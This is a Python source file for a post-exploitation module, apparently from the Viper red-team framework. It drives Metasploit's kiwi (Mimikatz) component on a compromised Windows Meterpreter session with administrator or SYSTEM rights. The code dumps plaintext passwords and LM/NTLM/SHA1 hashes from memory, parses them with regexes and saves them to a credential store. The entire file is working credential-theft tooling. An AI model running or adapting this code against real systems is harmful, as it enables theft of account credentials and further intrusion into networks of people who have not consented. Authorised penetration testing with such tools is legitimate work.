# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import re

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "获取Windows内存密码"
    DESC = "Kiwi抓取内存中的windows用户明文密码,并保存到凭证列表.\n"
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/gfubb8"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    AUTHOR = "Viper"

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/gather/credentials/kiwi_api"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)

        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"
        if session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权"
        return True, None

    @staticmethod
    def search(pattern, data, control):
        patterns = {
            'username': '\s+\*\s+Username\s+:\s+',
            'isusername': '\$\s*$|\(null\)\s*$|\@\s*$',
            'password': '\s+\*\s+Password\s+:\s+',
            'ispassword': '\(null\)\s*$',
            'domain': '\s+\*\s+Domain\s+:\s+',
            'isdomain': '\(null\)\s*$',
            'LM': '\s+\*\s+LM\s+:\s+',
            'isLM': '\(null\)\s*$',
            'NTLM': '\s+\*\s+NTLM\s+:\s+',
            'isNTLM': '\(null\)\s*$',
            'SHA1': '\s+\*\s+SHA1\s+:\s+',
            'isSHA1': '\(null\)\s*$',
        }
        if (re.search(r'{}'.format(patterns[pattern]), data) and not re.search(r'{}'.format(patterns[control]), data)):
            result = re.sub(r'{}'.format(patterns[pattern]), '', data).rstrip()
            if len(result) > 255:  # b4 47 c4 d3 03 5b 58 8a 6e 9d f4 异常处理
                return False
            else:
                return result
        else:
            return False

    def format_dict(self, tmpdict):
        if tmpdict.get('Password') is not None:
            result_str = "用户名:{} 域:{} 密码:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                    tmpdict.get('Password'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'Password'}
            self.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('Password'),
                                password_type='windows', tag=tag)

        if tmpdict.get('LM') is not None and tmpdict.get('NTLM') is not None:
            result_str = "用户名:{} 域:{} LM/NTLM:{}:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                            tmpdict.get('LM'), tmpdict.get('NTLM'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'Hash'}
            self.add_credential(username=tmpdict.get('Username'), password=f"{tmpdict.get('LM')}:{tmpdict.get('NTLM')}",
                                password_type='windows', tag=tag)

        if tmpdict.get('SHA1') is not None:
            result_str = "用户名:{} 域:{} SHA1:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                      tmpdict.get('SHA1'))
            self.log_good(result_str)
            tag = {'domain': tmpdict.get('Domain'), 'type': 'SHA1'}

    def callback(self, status, message, data):

        if status:
            output = data.replace('\x00', '')
            self.log_status("获取密码列表")
            tmpdict = {'Username': None, 'Domain': None, 'Password': None, 'LM': None, 'NTLM': None, 'SHA1': None}
            for line in output.split('\n'):
                username = self.search('username', line, 'isusername')
                if username:
                    if tmpdict.get('Username') is not None:
                        self.format_dict(tmpdict)
                        tmpdict = {'Username': username, 'Domain': None, 'Password': None, 'LM': None, 'NTLM': None,
                                   'SHA1': None}
                    else:
                        tmpdict['Username'] = username
                domain = self.search('domain', line, 'isdomain')
                if domain:
                    tmpdict['Domain'] = domain
                password = self.search('password', line, 'ispassword')
                if password:
                    tmpdict['Password'] = password

                LM = self.search('LM', line, 'isLM')
                if LM:
                    tmpdict['LM'] = LM
                NTLM = self.search('NTLM', line, 'isNTLM')
                if NTLM:
                    tmpdict['NTLM'] = NTLM
                SHA1 = self.search('SHA1', line, 'isSHA1')
                if SHA1:
                    tmpdict['SHA1'] = SHA1

            self.log_raw("\n\n")
            self.log_status("原始结果")
            self.log_raw(output)

        else:
            self.log_error("模块执行失败")
            self.log_error(message)
